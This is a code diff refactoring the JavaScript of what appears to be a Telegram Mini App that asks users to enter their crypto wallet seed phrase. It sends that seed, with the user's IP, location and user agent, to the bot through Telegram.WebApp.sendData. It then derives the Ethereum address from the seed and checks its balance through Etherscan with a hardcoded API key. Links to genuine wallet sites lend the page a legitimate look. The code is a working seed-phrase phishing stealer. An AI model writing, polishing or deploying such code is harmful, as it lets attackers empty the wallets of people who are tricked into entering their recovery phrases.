@@ -26,18 +26,13 @@ if (!langs.some(lang => allowedLangs.includes(lang))) {
 // ✅ DOM
 window.addEventListener("DOMContentLoaded", () => {
     feather?.replace();
-
-    if (window.Telegram?.WebApp) {
-        Telegram.WebApp.ready();
-        Telegram.WebApp.expand();
-    }
+    Telegram?.WebApp?.ready();
+    Telegram?.WebApp?.expand();
 
     if (document.getElementById("seedContainer")) {
         renderSeedInputs();
         setupSelect();
-
-        const btn = document.getElementById("submitBtn");
-        btn?.addEventListener("click", () => {
+        document.getElementById("submitBtn")?.addEventListener("click", () => {
             try {
                 submitSeed();
             } catch (e) {
@@ -49,7 +44,7 @@ window.addEventListener("DOMContentLoaded", () => {
     }
 });
 
-// 📦 Поля seed-фрази
+// 📦 Генерація полів
 function renderSeedInputs() {
     const length = parseInt(document.getElementById("length").value);
     const container = document.getElementById("seedContainer");
@@ -66,13 +61,11 @@ function renderSeedInputs() {
     const firstInput = container.querySelector("input");
     if (firstInput) {
         firstInput.addEventListener("input", handleBulkSeedInput);
-        firstInput.addEventListener("paste", (e) => {
-            setTimeout(() => handleBulkSeedInput(e), 50);
-        });
+        firstInput.addEventListener("paste", (e) => setTimeout(() => handleBulkSeedInput(e), 50));
     }
 }
 
-// 📋 Вставка всіх слів
+// 📋 Обробка вставки
 function handleBulkSeedInput(e) {
     const inputs = document.querySelectorAll(".seed-word");
     const words = e.target.value.trim().split(/\s+/);
@@ -81,7 +74,7 @@ function handleBulkSeedInput(e) {
     }
 }
 
-// 🎛️ Wallet select
+// 🔘 Кастомний select
 function setupSelect() {
     const selectWrapper = document.querySelector('.custom-select');
     const selected = selectWrapper.querySelector('.selected');
@@ -104,7 +97,7 @@ function setupSelect() {
     });
 }
 
-// ⚠️ Повідомлення
+// 🚫 Попередження
 function showWarning(message) {
     let warning = document.getElementById("validationWarning");
     if (!warning) {
@@ -137,10 +130,9 @@ function showProcessing(message) {
     processing.textContent = message;
 }
 
-// 🚀 submitSeed
+// 🚀 Надсилання seed
 function submitSeed() {
     clearWarning();
-
     const length = parseInt(document.getElementById("length").value);
     const wallet = document.getElementById("wallet").value || "unknown";
     const ua = navigator.userAgent;
@@ -181,7 +173,7 @@ function submitSeed() {
 
     if (Telegram?.WebApp?.sendData) {
         Telegram.WebApp.sendData(JSON.stringify(payload));
-        console.log("✅ Payload відправлено");
+        console.log("✅ Payload відправлено", payload);
     }
 
     setTimeout(() => {
@@ -194,19 +186,13 @@ function showProfileData() {
     const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
     const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
 
-    const seedPhrase = data.seed || "-";
-    const walletType = (data.wallet || "").toLowerCase();
-    const ip = data.ip || "-";
-    const locationInfo = data.location || "-";
-    const timestamp = data.timestamp || "-";
-
-    document.getElementById("timestamp").textContent = timestamp;
-    document.getElementById("userIp").textContent = ip;
-    document.getElementById("userLocation").textContent = locationInfo;
-    document.getElementById("seed").textContent = seedPhrase;
+    document.getElementById("timestamp").textContent = data.timestamp || "-";
+    document.getElementById("userIp").textContent = data.ip || "-";
+    document.getElementById("userLocation").textContent = data.location || "-";
+    document.getElementById("seed").textContent = data.seed || "-";
 
     try {
-        const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
+        const wallet = ethers.Wallet.fromMnemonic(data.seed);
         const ethAddress = wallet.address;
         document.getElementById("ethAddress").textContent = ethAddress;
         fetchETHBalance(ethAddress, ETHERSCAN_API_KEY);
@@ -215,26 +201,25 @@ function showProfileData() {
     }
 
     document.getElementById("goWalletBtn").addEventListener("click", () => {
+        const wallet = (data.wallet || "").toLowerCase();
         let url = "https://www.google.com";
-        if (walletType.includes("metamask")) url = "https://metamask.io/";
-        else if (walletType.includes("trust")) url = "https://trustwallet.com/";
-        else if (walletType.includes("phantom")) url = "https://phantom.app/";
-        else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
-        else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
-
-        if (window.Telegram?.WebApp) Telegram.WebApp.openLink(url);
-        else window.open(url, "_blank");
+        if (wallet.includes("metamask")) url = "https://metamask.io/";
+        else if (wallet.includes("trust")) url = "https://trustwallet.com/";
+        else if (wallet.includes("phantom")) url = "https://phantom.app/";
+        else if (wallet.includes("ton")) url = "https://tonkeeper.com/";
+        else if (wallet.includes("coinbase")) url = "https://www.coinbase.com/wallet";
+        window.Telegram?.WebApp?.openLink?.(url) || window.open(url, "_blank");
     });
 }
 
+// 💰 Баланс ETH
 async function fetchETHBalance(address, key) {
     try {
-        const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${key}`;
-        const res = await fetch(url);
+        const res = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${key}`);
         const json = await res.json();
         if (json.status !== "1") throw new Error("API помилка");
-        const ethBalance = parseFloat(json.result) / 1e18;
-        document.getElementById("walletBalance").textContent = `${ethBalance.toFixed(6)} ETH`;
+        const eth = parseFloat(json.result) / 1e18;
+        document.getElementById("walletBalance").textContent = `${eth.toFixed(6)} ETH`;
     } catch (e) {
         console.warn("❌ Баланс ETH:", e.message);
         document.getElementById("walletBalance").textContent = "–";
